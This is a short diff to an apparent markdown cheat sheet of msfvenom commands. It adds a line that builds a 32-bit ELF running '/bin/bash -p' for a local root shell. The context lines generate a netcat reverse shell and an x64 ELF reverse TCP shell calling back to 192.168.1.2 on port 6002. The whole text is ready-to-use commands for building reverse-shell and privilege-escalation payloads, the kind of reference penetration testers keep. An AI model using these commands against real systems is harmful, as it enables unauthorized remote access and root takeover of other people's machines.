@@ -24,6 +24,9 @@ msfvenom -p cmd/unix/reverse_netcat lhost=YOUR-IP lport=YOUR-PORT R
 
 # Generate ELF executable with payload for reverse shell
 msfvenom -p linux/x64/shell_reverse_tcp lhost=192.168.1.2 lport=6002 -f elf -o shell.elf
+
+# Generate ELF 32-bit executable for local root shell
+msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o shell.elf
 ```
 
 ## MSFConsole
